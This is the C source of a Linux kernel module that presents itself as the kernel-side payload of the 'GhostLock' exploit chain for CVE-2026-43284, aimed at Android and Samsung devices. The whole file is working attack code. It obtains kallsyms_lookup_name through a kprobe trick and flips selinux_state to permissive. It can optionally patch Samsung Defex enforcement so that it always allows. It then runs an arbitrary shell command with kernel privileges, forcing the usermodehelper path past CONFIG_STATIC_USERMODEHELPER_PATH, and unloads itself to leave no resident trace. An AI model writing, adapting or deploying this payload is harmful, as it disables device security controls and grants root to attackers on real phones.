// SPDX-License-Identifier: GPL-2.0
/*
 * GhostLock minimal kernel-side payload (CVE-2026-43284 chain, B5-9h-LKM).
 *
 * Loaded once through insmod from the init / vendor_modprobe domain by the
 * page-cache chain. It runs in kernel context, performs exactly the four steps
 * the chain needs, then returns an error so the module is not kept resident.
 *
 *   1. resolve arbitrary kernel symbols through kallsyms_lookup_name (obtained
 *      with the classic kprobe trick, because the symbol is not exported);
 *   2. optionally set SELinux permissive (module parameter "permissive",
 *      default 1) - the init-domain work that follows needs it;
 *   3. run one userspace command through call_usermodehelper (module parameter
 *      "cmd", default the inert /system/bin/true) after forcing
 *      subprocess_info->path to /system/bin/sh, which defeats
 *      CONFIG_STATIC_USERMODEHELPER_PATH="";
 *   4. optionally hook the Samsung Defex entry points (module parameter
 *      "defex", default 0). On non-Samsung kernels those symbols do not exist
 *      and the failure is recorded but not fatal.
 *
 * Differences from the upstream DFRoot LKM: the Samsung-specific behaviour is
 * opt-in, the command is a bounded module parameter instead of a hard-coded
 * string, the default command is inert, every step is logged for on-device
 * verification, and a missing mandatory symbol aborts before any state change.
 *
 * Returning -E2BIG is deliberate: a failing module_init makes the kernel unload
 * the module, so nothing stays resident.
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/umh.h>

#define GHOSTLOCK_CMD_MAX 512

/* Default command: the chain prepends no insmod argv (the libcxx hook has six
 * value slots and none carries extra arguments), so the module must know what to
 * run by itself. The path is written by the host tooling before the run; it is
 * still overridable with the cmd= module parameter for manual tests. */
static char *cmd = "/data/local/tmp/.ghostlock_lkm_cmd.sh";
module_param(cmd, charp, 0400);
MODULE_PARM_DESC(cmd, "Command string passed to /system/bin/sh -c");

static int permissive = 1;
module_param(permissive, int, 0400);
MODULE_PARM_DESC(permissive, "Set SELinux permissive before running the command");

static int defex = 0;
module_param(defex, int, 0400);
MODULE_PARM_DESC(defex, "Hook Samsung Defex entry points when present");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
typedef void *(*umh_setup_t)(const char *, char **, char **, gfp_t,
                             int (*)(struct subprocess_info *, struct cred *),
                             void (*)(struct subprocess_info *), void *);
typedef int (*umh_exec_t)(struct subprocess_info *, int);

static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    (void)p;
    regs->regs[0] = 0;         /* DEFEX_ALLOW */
    regs->pc = regs->regs[30]; /* skip the body, return to the caller */
    return 1;
}

static int __init ghostlock_init(void)
{
    static const char sh[] = "/system/bin/sh";
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", NULL, NULL };
    struct kprobe kln_kp;
    kallsyms_lookup_name_t get_addr;
    umh_setup_t umh_setup;
    umh_exec_t umh_exec;
    struct subprocess_info *info;
    int ret;

    if (cmd == NULL || *cmd == '\0' || strlen(cmd) >= GHOSTLOCK_CMD_MAX) {
        pr_err("ghostlock: invalid cmd parameter\n");
        return -EINVAL;
    }
    argv[2] = cmd;

    /* 1. arbitrary symbol resolution: kallsyms_lookup_name is not exported. */
    memset(&kln_kp, 0, sizeof(kln_kp));
    kln_kp.symbol_name = "kallsyms_lookup_name";
    ret = register_kprobe(&kln_kp);
    if (ret < 0) {
        pr_err("ghostlock: kallsyms_lookup_name unavailable (%d)\n", ret);
        return ret;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    /* 2. SELinux permissive (opt out with permissive=0). */
    if (permissive) {
        bool *selinux_state = (bool *)get_addr("selinux_state");
        if (selinux_state == NULL) {
            pr_err("ghostlock: selinux_state not found; refusing to continue\n");
            return -EINVAL;
        }
        WRITE_ONCE(*selinux_state, false);
        pr_info("ghostlock: selinux_state set permissive\n");
    } else {
        pr_info("ghostlock: permissive=0, SELinux untouched\n");
    }

    /* 3. optional Samsung Defex bypass (best effort; absence is not fatal). */
    if (defex) {
        struct kprobe kp;
        memset(&kp, 0, sizeof(kp));
        kp.addr = (kprobe_opcode_t *)get_addr("task_defex_enforce");
        kp.pre_handler = defex_pre_handler;
        if (kp.addr != NULL && register_kprobe(&kp) == 0)
            pr_info("ghostlock: task_defex_enforce hooked\n");
        else
            pr_info("ghostlock: task_defex_enforce not hooked\n");
    }

    /* 4. run the userspace command through UMH. */
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (umh_setup == NULL || umh_exec == NULL) {
        pr_err("ghostlock: usermodehelper symbols missing\n");
        return -EINVAL;
    }
    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (info == NULL) {
        pr_err("ghostlock: call_usermodehelper_setup failed\n");
        return -EINVAL;
    }
    /* Defeat CONFIG_STATIC_USERMODEHELPER_PATH="" (which would blank the path). */
    info->path = sh;
    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("ghostlock: umh exec returned %d for cmd=%s\n", ret, cmd);

    /* Deliberate failure so the module is unloaded and never stays resident. */
    return -E2BIG;
}

module_init(ghostlock_init);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("GhostLock minimal kernel-side payload");
MODULE_AUTHOR("GhostLock");
